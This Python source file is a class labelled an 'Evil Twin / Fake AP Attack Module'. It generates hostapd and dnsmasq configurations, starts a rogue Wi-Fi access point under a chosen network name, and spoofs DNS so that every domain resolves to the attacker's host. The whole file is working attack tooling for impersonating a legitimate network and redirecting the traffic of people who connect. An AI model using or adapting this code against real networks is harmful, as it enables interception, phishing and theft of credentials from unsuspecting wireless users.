import subprocess
import os

class EvilTwin:
    """Evil Twin / Fake AP Attack Module"""
    
    def __init__(self, ssid, interface, channel=6):
        self.ssid = ssid
        self.interface = interface
        self.channel = channel
        self.hostapd_proc = None
        self.dnsmasq_proc = None
    
    def create_ap(self):
        """Create fake access point"""
        try:
            # Create hostapd config
            config = self._generate_hostapd_config()
            with open("/tmp/hostapd.conf", "w") as f:
                f.write(config)
            
            cmd = ["hostapd", "/tmp/hostapd.conf"]
            self.hostapd_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except Exception as e:
            return False
    
    def start_dns_spoof(self):
        """Start DNS spoofing"""
        try:
            config = self._generate_dnsmasq_config()
            with open("/tmp/dnsmasq.conf", "w") as f:
                f.write(config)
            
            cmd = ["dnsmasq", "-C", "/tmp/dnsmasq.conf"]
            self.dnsmasq_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except Exception as e:
            return False
    
    def stop(self):
        """Stop evil twin"""
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
    
    def _generate_hostapd_config(self):
        return f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
auth_algs=1
"""
    
    def _generate_dnsmasq_config(self):
        return """interface=wlan0
dhcp-range=192.168.1.2,192.168.1.20,255.255.255.0,12h
address=/#/192.168.1.1
"""
